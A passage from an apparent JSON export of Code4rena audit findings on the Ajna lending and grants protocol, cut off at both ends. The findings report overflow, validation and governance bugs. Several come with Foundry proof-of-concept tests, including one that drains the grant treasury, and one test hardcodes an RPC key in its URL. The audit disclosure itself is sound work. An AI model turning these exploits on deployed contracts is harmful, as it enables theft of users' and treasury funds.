depositIndexes[0] = 9; +        uint256 mintAmount = uint256(type(uint128).max) + 1; +        uint256 tokenIdOne = _mintAndMemorializePositionNFT({ +            indexes:    depositIndexes, +            minter:     _minterOne, +            mintAmount: mintAmount, +            pool:       address(_pool) +        }); +        uint256 lpBalance; +        (lpBalance, ) =_pool.lenderInfo(depositIndexes[0], address(_positionManager)); +        console2.log(\"_pool.lenderInfo for _positionManager before stake\", lpBalance); + +        // minterOne deposits their NFT into the rewards contract +        _stakeToken({ +            pool:    address(_pool), +            owner:   _minterOne, +            tokenId: tokenIdOne +        }); +        uint256 lpsAtStakeTime; +        uint256 rateAtStakeTime; +        (lpsAtStakeTime, rateAtStakeTime) = _rewardsManager.getBucketStateStakeInfo(tokenIdOne, depositIndexes[0]); +        console2.log(\"getBucketStateStakeInfo.lpsAtStakeTime after stake\", lpsAtStakeTime); +    } +     ``` ## Tools Used * Manual review * Foundry  ## Recommended Mitigation Steps * use OpenZeppelin\u2019s SafeCast library when casting from uint256 to uint128. * don't make casting from uint256 to uint128    ## Assessed type  Under/Overflow"}, {"title": "StandardFunding.fundingVote should not allow users who didn't vote in screening stage to vote", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/224", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519   # Vulnerability details  ## Impact  Users who did not vote in the screening stage but voted in the funding stage are not allowed to claim rewards via `claimDelegateReward`. **Voting in the funding stage will occupy the distribution ratio of rewards**. Since these rewards cannot be claimed, in the long run, the ajnaToken balance of the GrantFund contract is inconsistent with `treasury`.  ## Proof of Concept  At the beginning of the `StandardFunding.claimDelegateReward` function, check whether the caller voted in the screening stage.  ```solidity function claimDelegateReward(         uint24 distributionId_     ) external override returns(uint256 rewardClaimed_) {         // Revert if delegatee didn't vote in screening stage ->      if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();          QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];         ...     } ```  `StandardFunding.fundingVote` is used to vote in the funding stage. This function does not check whether the caller voted in the screening stage. `fundingVote` subcalls [_fundingVote](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612), which affects the allocation of rewards. `_getDelegateReward` is used by `claimDelegateReward` to calculate the reward distributed to the caller.  ```solidity function _getDelegateReward(         QuarterlyDistribution memory currentDistribution_,         QuadraticVoter memory voter_     ) internal pure returns (uint256 rewards_) {         // calculate the total voting power available to the voter that was allocated in the funding stage         uint256 votingPowerAllocatedByDelegatee = voter_.votingPower - voter_.remainingVotingPower;          // if none of the voter's voting power was allocated, they receive no rewards         if (votingPowerAllocatedByDelegatee == 0) return 0;          // calculate reward         // delegateeReward = 10 % of GBC distributed as per delegatee Voting power allocated ->      rewards_ = Maths.wdiv(             Maths.wmul(                 currentDistribution_.fundsAvailable, //total funds in current distribution                 votingPowerAllocatedByDelegatee  //voter's vote power             ),             currentDistribution_.fundingVotePowerCast //total vote power in current distribution         ) / 10;      // 10% fundsAvailable     } ```  As long as `fundingVote` is successfully called, it means that **the reward is locked to the caller**. However, the caller cannot claim these rewards. **There is no code to calculate the amount of these rewards that can never be claimed**.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Two ways to fix this problem:  1.  `FundingVote` does not allow users who didn't vote in screening stage. 2.  Delete the code on line [L240](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L240).   ## Assessed type  Other"}, {"title": "A malicious user can permanently DoS proposal execution.", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/188", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "duplicate-280"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/Funding.sol#L112-L142   # Vulnerability details  ## Impact  A malicious user can create a proposal with the AjnaToken address as the target, which will cause the proposal execution to fail when the time comes. Although the funds are not lost and can be eventually returned to the treasury, the protocol's functionality and availability could be negatively affected,   ## Proof of Concept  To create a standard or extraordinary proposal, users must provide the following information:  -   targets -   values -   calldatas -   description  ```solidity    /// @inheritdoc IExtraordinaryFunding     function proposeExtraordinary(         uint256 endBlock_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_,         string memory description_) external override returns (uint256 proposalId_) {          ```  In this case targets will be the addresses that are supposed to receive the funds if the proposal goes through.  In this case, targets represent the addresses receiving funds if the proposal is approved. For `values[]`, each value must be 0 because we are transferring Ajna tokens. Regarding `calldatas`, each individual calldata must contain `0xa9059cbb`, which is the function selector for `transfer(address,uint256)`, the address of the receiver and the amount to be received.  This function will be called on the AjnaToken address when it is time for execution. The `_validateCalldatas` function is responsible for validating this information.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/Funding.sol#L104-L108  ```solidity     function _validateCallDatas(         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_     ) internal view returns (uint128 tokensRequested_) {          // check params have matching lengths         if (targets_.length == 0 || targets_.length != values_.length || targets_.length != calldatas_.length) revert InvalidProposal();          for (uint256 i = 0; i < targets_.length;) {              // check targets and values params are valid             if (targets_[i] != ajnaTokenAddress || values_[i] != 0) revert InvalidProposal();             // @audit doesn't validate if the receiver exists              // check calldata function selector is transfer()             bytes memory selDataWithSig = calldatas_[i];              bytes4 selector;             //slither-disable-next-line assembly             assembly {                 selector := mload(add(selDataWithSig, 0x20))             }             if (selector != bytes4(0xa9059cbb)) revert InvalidProposal();              // https://github.com/ethereum/solidity/issues/9439             // retrieve tokensRequested from incoming calldata, accounting for selector and recipient address             uint256 tokensRequested;             bytes memory tokenDataWithSig = calldatas_[i];             //slither-disable-next-line assembly             assembly {                 tokensRequested := mload(add(tokenDataWithSig, 68))             }              // update tokens requested for additional calldata             tokensRequested_ += SafeCast.toUint128(tokensRequested);              unchecked { ++i; }         }     } ```  The issue with the current implementation is that while values and calldatas are validated, targets are not.   In some cases, this could impact the functionality or availability of the protocol because the proposal execution will fail.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/Funding.sol#L60-L65  ```solidity          string memory errorMessage = \"Governor: call reverted without message\";         for (uint256 i = 0; i < targets_.length; ++i) {             (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);             Address.verifyCallResult(success, returndata, errorMessage);         } ```   Once a proposal is created, the target cannot be changed, because the `proposalId` is a hash of the targets, calldatas and values.  It is important to note that there is no way to check the proposal execution receiver without examining the transaction calldata since there are no functions that expose the proposal creation data.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/Funding.sol#L154-L161  ```solidity     function _hashProposal(         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_,         bytes32 descriptionHash_     ) internal pure returns (uint256 proposalId_) {         proposalId_ = uint256(keccak256(abi.encode(targets_, values_, calldatas_, descriptionHash_)));     } ```  The actual execution of the proposal happens here \ud83d\udc47  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/Funding.sol#L51-L66   ```solidity      */     function _execute(         uint256 proposalId_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_     ) internal {         // use common event name to maintain consistency with tally         emit ProposalExecuted(proposalId_);          string memory errorMessage = \"Governor: call reverted without message\";         for (uint256 i = 0; i < targets_.length; ++i) {             (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);             Address.verifyCallResult(success, returndata, errorMessage);         }     } ```  Which calls AjnaToken's withdraw function to transfer the funds to the target  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L11-L14  ```solidity contract AjnaToken is ERC20, ERC20Burnable, ERC20Permit, ERC20Votes {     constructor(address tokenReceiver_) ERC20(\"AjnaToken\", \"AJNA\") ERC20Permit(\"AjnaToken\") {         _mint(tokenReceiver_, 2_000_000_000 * 10 ** decimals());     } ```  However, upon observing AjnaToken's functionality, we see that the `_beforeTokenTransfer` hook ensures that tokens cannot be transferred to the AjnaToken contract itself.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L27-L29  ```solidity    function _beforeTokenTransfer(address, address to_, uint256) internal view override {         require(to_ != address(this), \"Cannot transfer tokens to the contract itself\");     } ```  A malicious user can take advantage of that and create a proposal with the AjnaToken address as target, which will brick the execution of the proposal when the time comes.   Consider the case when the proposal is **Standard**: 1. A proposal is created 2. It gets past screening and is in top 10 3. It gets funded 4. The challenge period has finished 5. The proposal can get executed but fails because the receiver is the Ajna contract.  Normally, this wouldn't be a huge deal,but each distribution period is 3 months. So in this case the proposal would go through various stages to figure in 3 months that the proposal won't get executed.  Since there are assets not at direct risk, but the protocol's function or availability could be certainly impacted, I'm rating this as a Medium.  Here's a PoC that showcases the scenario.  ```solidity   function testDoSFirstProposal() external {         // 14 tokenholders self delegate their tokens to enable voting on the proposals         _selfDelegateVoters(_token, _votersArr);          vm.roll(_startBlock + 150);          /*********************************/         /*** First Distribution Period ***/         /*********************************/          // start first distribution         _startDistributionPeriod(_grantFund);          uint24 distributionId = _grantFund.getDistributionId();          (, , , uint128 gbc_distribution1, , ) = _grantFund.getDistributionPeriodInfo(distributionId);          assertEq(gbc_distribution1, 15_000_000 * 1e18);                  TestProposalParams[] memory testProposalParams_distribution1 = new TestProposalParams[](1);         testProposalParams_distribution1[0] = TestProposalParams(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079, 8_500_000 * 1e18);          // create 1 proposal paying out tokens         TestProposal[] memory testProposals_distribution1 = _createNProposals(_grantFund, _token, testProposalParams_distribution1);         assertEq(testProposals_distribution1.length, 1);          vm.roll(_startBlock + 200);          // screening period votes         _screeningVote(_grantFund, _tokenHolder1, testProposals_distribution1[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));          // skip time to move from screening period to funding period         vm.roll(_startBlock + 600_000);          // check topTenProposals array is correct after screening period - only 1 should have advanced         GrantFund.Proposal[] memory screenedProposals_distribution1 = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));         assertEq(screenedProposals_distribution1.length, 1);          // funding period votes         _fundingVote(_grantFund, _tokenHolder1, screenedProposals_distribution1[0].proposalId, voteYes, 50_000_000 * 1e18);          // skip to the Challenge period         vm.roll(_startBlock + 650_000);          uint256[] memory potentialProposalSlate = new uint256[](1);         potentialProposalSlate[0] = screenedProposals_distribution1[0].proposalId;          // updateSlate         _grantFund.updateSlate(potentialProposalSlate, distributionId);          // skip to the end of Challenge period         vm.roll(_startBlock + 700_000);          // check proposal status isn't defeated         IFunding.ProposalState proposalState = _grantFund.state(testProposals_distribution1[0].proposalId);         assert(uint8(proposalState) != uint8(IFunding.ProposalState.Defeated));          // check proposal status is succeeded         proposalState = _grantFund.state(testProposals_distribution1[0].proposalId);         assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Succeeded));          // execute funded proposals         _executeProposal(_grantFund, _token, testProposals_distribution1[0]);      } ```  Running the test, yields us the following result: ![](https://i.imgur.com/KfP7IDL.png)  Regrettably, the resources allocated to a specific proposal become permanently locked within it, with the protocol lacking the functionality to recoup them back into the treasury.  Within Ajna, grants are allocated during distinct distribution periods, each spanning three months.  Subject to certain prerequisites, a new distribution period can be activated by calling the following function:  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L120-L140  ```solidity function startNewDistributionPeriod() external override returns (uint24 newDistributionId_) {         uint24  currentDistributionId       = _currentDistributionId;         uint256 currentDistributionEndBlock = _distributions[currentDistributionId].endBlock;          // check that there isn't currently an active distribution period         if (block.number <= currentDistributionEndBlock) revert DistributionPeriodStillActive();          // update treasury with unused funds from last two distributions         {             // Check if any last distribution exists and its challenge stage is over             if (currentDistributionId > 0 && (block.number > _getChallengeStageEndBlock(currentDistributionEndBlock))) {                 // Add unused funds from last distribution to treasury                 _updateTreasury(currentDistributionId);             }              // checks if any second last distribution exist and its unused funds are not added into treasury             if (currentDistributionId > 1 && !_isSurplusFundsUpdated[currentDistributionId - 1]) {                 // Add unused funds from second last distribution to treasury                 _updateTreasury(currentDistributionId - 1);             }         } ```  Should the validation confirming the absence of an active distribution period be successful, the function subsequently retrieves and yields the unused funds from the preceding two distribution periods. This is to cover the scenario where for example there are no proposals to execute, but funds were allocated to the distribution period.  In instigating a new distribution, the funds entangled in the unexecutable proposal are expected to be reimbursed to the treasury.  Nonetheless, since the proposal has been approved and is listed in the `fundedSlateHash`, the `updateTreasury` function will infer it as executable and awaiting payment. (that's by design). So, it will add its `tokenRequested` to the `totalTokensRequested`.  ```solidity     function _updateTreasury(         uint24 distributionId_     ) private {         bytes32 fundedSlateHash = _distributions[distributionId_].fundedSlateHash;         uint256 fundsAvailable  = _distributions[distributionId_].fundsAvailable;          uint256[] memory fundingProposalIds = _fundedProposalSlates[fundedSlateHash];          uint256 totalTokensRequested;         uint256 numFundedProposals = fundingProposalIds.length;          for (uint i = 0; i < numFundedProposals; ) {             Proposal memory proposal = _standardFundingProposals[fundingProposalIds[i]];              totalTokensRequested += proposal.tokensRequested;              unchecked { ++i; }         }          // readd non distributed tokens to the treasury         // @audit-info in which scenario can  we have non distributed tokens?         treasury += (fundsAvailable - totalTokensRequested);          _isSurplusFundsUpdated[distributionId_] = true;     } ```  This situation culminates in the treasury not receiving a refund for the total number of tokens requested in that specific proposal. Yet, the proposal itself cannot be executed, resulting in the permanent entrapment of the funds. This outcome is further substantiated by the update to the `_isSurplusFundsUpdated` mapping, causing the ensnared funds to become irreversibly unobtainable.  Considering all of these factors, I propose that the appropriate severity for this finding should be classified as 'High', based on the C4 [categorization criteria](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).  > **High:** Assets can be directly or indirectly stolen, lost, or compromised (the latter only if there exists a credible attack route devoid of speculative scenarios).  Evidently, a credible and feasible attack path exists. First, one could contend that the faulty proposal might enter the leading slate. Yet, it could be replaced by a new top slate featuring different proposals before the period ends, providing it is more optimal. This would then potentially exclude the invalid proposal.  Nonetheless, if the proposal pool during the screening period is under 10 (no new proposals can be considered after the screening period has ended), or if a user or a coalition has accumulated enough votes to propel a malicious proposal forward, these considerations become immaterial.     ## Tools Used  Manual Review  ## Recommended Mitigation Steps  In the `_validateCallDatas` function, validate the token receiver's address, ensuring it is not the AjnaToken's address.         ## Assessed type  DoS"}, {"title": "Users can claim rewards while the challenge period is still active", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/187", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L240-L250   # Vulnerability details  ## Impact  This issue allows users to claim rewards while the challenge period is still active, which is unintended behavior.   ## Proof of Concept  The claimDelegateReward function is used by users to claim their rewards. However, there is a restriction where they should not be able to claim rewards if the challenge period is still active.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L240-L250  ```solidity  /// @inheritdoc IStandardFunding     function claimDelegateReward(         uint24 distributionId_     ) external override returns(uint256 rewardClaimed_) {         // Revert if delegatee didn't vote in screening stage         if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();          QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];          // Check if Challenge Period is still active         if(block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded(); ```  However, the current check `block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)` allows them to claim rewards even though they should not be able to. This was further confirmed by the sponsor.   ## Tools Used  Manual Review   ## Recommended Mitigation Steps  Modify the check to use `<=`  `if(block.number <= _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();`   ## Assessed type  Invalid Validation"}, {"title": "User can avoid bankrupting by calling PositionManager.moveLiquidity where to index is bankrupted index", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/179", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-09"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333   # Vulnerability details  ## Impact User can avoid bankrupting by calling PositionManager.moveLiquidity where to index is bankrupted index  ## Proof of Concept Bucket could become insolvent and in that case all LP within the bucket are zeroed out (lenders lose all their LP). Because of that, `PositionManager.reedemPositions` [will not allow to redeem index that is bankrupted](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L372).  When user wants to move his LPs from one bucket to another he can call `PositionManager.moveLiquidity` where he will provide from and to indexes. https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333 ```solidity     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars;         vars.depositTime = fromPosition.depositTime;          // handle the case where owner attempts to move liquidity after they've already done so         if (vars.depositTime == 0) revert RemovePositionFailed();          // ensure bucketDeposit accounts for accrued interest         IPool(params_.pool).updateInterest();          // retrieve info of bucket from which liquidity is moved           (             vars.bucketLP,             vars.bucketCollateral,             vars.bankruptcyTime,             vars.bucketDeposit,         ) = IPool(params_.pool).bucketInfo(params_.fromIndex);          // check that bucket hasn't gone bankrupt since memorialization         if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();          // calculate the max amount of quote tokens that can be moved, given the tracked LP         vars.maxQuote = _lpToQuoteToken(             vars.bucketLP,             vars.bucketCollateral,             vars.bucketDeposit,             fromPosition.lps,             vars.bucketDeposit,             _priceAt(params_.fromIndex)         );          EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          // remove bucket index from which liquidity is moved from tracked positions         if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();          // update bucket set at which a position has liquidity         // slither-disable-next-line unused-return         positionIndex.add(params_.toIndex);          // move quote tokens in pool         (             vars.lpbAmountFrom,             vars.lpbAmountTo,         ) = IPool(params_.pool).moveQuoteToken(             vars.maxQuote,             params_.fromIndex,             params_.toIndex,             params_.expiry         );          Position storage toPosition = positions[params_.tokenId][params_.toIndex];          // update position LP state         fromPosition.lps -= vars.lpbAmountFrom;         toPosition.lps   += vars.lpbAmountTo;         // update position deposit time to the from bucket deposit time         toPosition.depositTime = vars.depositTime;          emit MoveLiquidity(             ownerOf(params_.tokenId),             params_.tokenId,             params_.fromIndex,             params_.toIndex,             vars.lpbAmountFrom,             vars.lpbAmountTo         );     } ``` As you can see `from` bucket is checked to be not bankrupted before the moving. And after the move, LPs of `from` and `to` buckets are updated. Also `depositTime` of `to` bucket is updated to `from.depositTime`.  The problem here is that `to` bucket was never checked to be not bankrupted. Because of that it's possible that bankrupted `to` bucket now becomes not bankrupted as their depositTime is updated now.  This is how this can be used by attacker. 1.Attacker has lp shares in the bucket, linked to token and this bucket became bankrupt. 2.Then attacker mints small amount of LP in the Pool and then memorizes this index to the token. 3.Attacker calls `moveLiquidity` with `from`: new bucket and `to`: bankrupt bucket. 4.Now attacker can redeem his lp shares from bankrupt bucket as depositedTime is updated now.  As result, attacker was able to steal LPs of another people from `PositionManager` contract. ## Tools Used VsCode ## Recommended Mitigation Steps In case if `to` bucket is bankrupt, then clear LP for it before adding moved lp shares.   ## Assessed type  Error"}, {"title": "Governance attack on Extraordinary Proposals", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/164", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-12"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L173   # Vulnerability details  ## Impact  The mechanics for Extraordinary proposals are simple and robust for attacks. There is a variable that is called Minimum Threshold (MT). The maximum amount of treasury tokens that can be requested on a proposal is bounded by MT. Basically, you can request any amount of tokens up to a maximum percentage of (1 - MT).  For a proposal to succeed, it needs a percentage of non-treasury tokens equal or greater than:  `MT + percentage of treasury tokens requested`  Quoting the whitepaper:  ``` a. A proposer requests tokens equivalent to 10% of the treasury    i. 50% + 10% = 60%    ii. If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released    iii. If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released ```  For example, if you want to request the max percentage of treasury tokens, that is `1 - MT`, the proposal will need `(1 - MT) + MT` percentage of non-treasury tokens, it means 100%. Note that I am not giving a specific value for `MT`, so this should hold for any extraordinary proposal, even when the value of `MT` changes. The design is correct, but the implementation is not. The implementation of the constraint of votes needed for a proposal is implemented as follows:  `votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage)`  To see where is the mistake we must convert the above formula into percentages, so we can compared it with what is written in the whitepaper. We know that `votesReceived` is some percentage (P1) of Non-treasury tokens, `tokensRequested` is some percentage (P2) of treasury tokens and `_getSliceOfNonTreasury(minThresholdPercentage)` is some percentage (P3) of Non-treasury tokens.  We also know that P2 is bounded by the minimum threshold, because we want to test the case where the maximum is requested then P2 becomes `(1 - MT)` and we know that P3 is `MT`. Re-writing:  `(P1)(NonTreasuryT) = (1 - MT)(TreasuryT) + (MT)(NonTreasuryT)`  I changed `>=` for `=` because I am interested on the minimum votes needed. Divide by `NonTreasuryT`, rewrite:  `P1 = ((1 - MT)(TreasuryT) / (NonTreasuryT)) + MT`  Now we have the formula re-written in terms of percentages, where we can see that `1 - MT` which is the percentage of requested treasury tokens is multiplied by the division of `TreasuryT / NonTreasuryT`. This has the consequence of reducing `1 - MT` since `NonTreasuryT` will be greater than `TreasuryT`. For example, let's take the case where the 1st proposal request the maximum amount of treasury tokens, that is, 50%.  `P1 = ((50%)(TreasuryT) / (NonTreasuryT)) + 50%`  Is clearly to see that P1 will be smaller than 100% (in the case where TreasuryT < NonTreasuryT), violating the design described on the whitepaper.  The proof of concept presented below is a scenario based on a total supply of 1B tokens, and a treasury of 300M tokens. In this scenario:  `P1 = ((50%)(300M) / (700M)) + 50% == 71.4%`  If we want to request again the maximum treasury tokens on the second proposal we will need:  `P1 = ((45%)(150M) / (850M)) + 55% == 62.94%`  We see a reduction on the percentage of non-treasury tokens needed between proposals, which should not happen, remember than on the design described on the whitepaper a proposal always need 100% of non treasury tokens when requesting the max amount of treasury tokens, no mattering the value of `MT`.  The PoC shows a possible scenario where an attacker can take advantage of this mistake that will allow him to drain the treasury if he manages to execute the first proposal.  The PoC is based on the assumption that the attacker manages to get a big portion (385M out of 700 non treasury tokens) of ajna tokens and convince other holders (115M of tokens) to vote (or delegate to him) for his proposal requesting the 50% of the treasury. If the attacker manages to achieve this, then he can drain the treasury alone, using the next proposals (because of the reduction of the percentage needed), even without the help of the previous holders.  ## Proof of Concept  1.- Create a file under `test/unit/` and call it `ExploitEF.t.sol`  2.- Copy and paste the following:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.16;  import { GrantFund }             from \"../../src/grants/GrantFund.sol\"; import { IExtraordinaryFunding } from \"../../src/grants/interfaces/IExtraordinaryFunding.sol\"; import { IFunding }              from \"../../src/grants/interfaces/IFunding.sol\"; import { GrantFundTestHelper }   from \"../utils/GrantFundTestHelper.sol\"; import { IAjnaToken }            from \"../utils/IAjnaToken.sol\"; import { DrainGrantFund }        from \"../interactions/DrainGrantFund.sol\";  contract ExploitEF is GrantFundTestHelper {      IAjnaToken        internal  _token;     GrantFund         internal  _grantFund;      // Ajna token Holder at the Ajna contract creation on mainnet     address internal _tokenDeployer  = 0x666cf594fB18622e1ddB91468309a7E194ccb799;     address internal _attacker   = makeAddr(\"_tokenHolder1\");     address internal _tokenHolder2   = makeAddr(\"_tokenHolder2\");     address internal _tokenHolder3   = makeAddr(\"_tokenHolder3\");     address internal _tokenHolder4   = makeAddr(\"_tokenHolder4\");     address internal _tokenHolder5   = makeAddr(\"_tokenHolder5\");     address internal _tokenHolder6   = makeAddr(\"_tokenHolder6\");      address[] internal _votersArrAttacker = [         _attacker     ];      address[] internal _votersArr = [         _tokenHolder2,         _tokenHolder3,         _tokenHolder4,         _tokenHolder5,         _tokenHolder6     ];      address[] internal _helperAttackerDelegatee = [       _attacker,       _attacker,       _attacker,       _attacker,       _attacker     ];      // at this block on mainnet, all ajna tokens belongs to _tokenDeployer     uint256 internal _startBlock      = 16354861;     // at this block on mainnet, 1B ajna tokens where burned, reducing the supply to 1B.     uint256 internal _startBlock2      = 16478160;      function setUp() external {         vm.createSelectFork(\"https://eth-mainnet.g.alchemy.com/v2/V2bjD46crGUhn4EDk92txmvC0BFqLzjo\", _startBlock2);          vm.startPrank(_tokenDeployer);          // Ajna Token contract address on mainnet         _token = IAjnaToken(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079);          // deploy growth fund contract         _grantFund = new GrantFund();          // initial minter distributes tokens to test addresses         _transferAjnaTokens(_token, _votersArrAttacker, 385_000_000 * 1e18, _tokenDeployer);         _transferAjnaTokens(_token, _votersArr, 23_000_000 * 1e18, _tokenDeployer);          // initial minter distributes treasury to grantFund         // A treasury with 300M ajna tokens (Using whitepaper values)         changePrank(_tokenDeployer);         _token.approve(address(_grantFund), 300_000_000 * 1e18);         _grantFund.fundTreasury(300_000_000 * 1e18);     }          function test_drainTreasury() external {       /*         STATUS:          - Attacker has 385M of ajna tokens         - Holders from 2 to 6 have 23M of ajna tokens each, total of = 115M         - TotalSupply is 1B ajna tokens.         - Treasury is 300M ajna tokens         - Non-Treasury tokens are 700M tokens       */       assertEq(_token.balanceOf(_attacker), 385_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);       assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);       assertEq(_grantFund.treasury(), 300_000_000 * 1e18);       assertEq(_grantFund.getSliceOfNonTreasury(1e18), 700_000_000 * 1e18);        // Attacker self delegates       _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);       // All holders delegate their tokens to the attacker.       _delegateTo(_token, _votersArr, _helperAttackerDelegatee);        vm.roll(_startBlock2 + 100);        // set proposal params       uint256 endBlockParam = block.number + 100_000;        // 150M tokens requested, that is 50% of treasury       uint256 tokensRequestedParam = 150_000_000 * 1e18;        // generate proposal targets       address[] memory targets = new address[](1);       targets[0] = address(_token);        // generate proposal values       uint256[] memory values = new uint256[](1);       values[0] = 0;        // generate proposal calldata       bytes[] memory calldatas = new bytes[](1);       calldatas[0] = abi.encodeWithSignature(         \"transfer(address,uint256)\",         _attacker,         tokensRequestedParam       );        // create and submit proposal       TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(         _grantFund,         _attacker,         endBlockParam,         targets,         values,         calldatas,         \"We are requesting 50% of the treasury since this is a super important and big development for the ecosystem\"       );        // Attacker has 500M of voting power which is ~ 71.4% of Non-Treasury Tokens       uint256 attackerVotingPowerForEP = _grantFund.getVotesExtraordinary(_attacker, testProposal.proposalId);       assertEq(attackerVotingPowerForEP, 500_000_000 * 1e18);        changePrank(_attacker);       _grantFund.voteExtraordinary(testProposal.proposalId);        // Proposal state is Succeeded with only a 500M voting power.       // Attacker was able to request 50% of treasury with only 71.4% of the Non-treasury tokens.       // Whitepaper says that in order to request 50% of tokens (1st proposal, so Minium Threshold equals 50%),        // the proposal will need 50% + 50% = 100% of Non-Treasury tokens. Which here is demostrated that you only need 71.4%.       IFunding.ProposalState proposalState = _grantFund.state(testProposal.proposalId);       assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Succeeded));        // execute proposal       _grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(testProposal.description)));        /*         Status after the 1st proposal success:          - Attacker has 535M of ajna tokens         - Holders from 2 to 6 have 23M of ajna tokens each, total of = 125M         - TotalSupply is 1B ajna tokens.         - Treasury is 150M ajna tokens         - Non-Treasury tokens are 850M tokens       */       assertEq(_token.balanceOf(_attacker), 535_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);       assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);       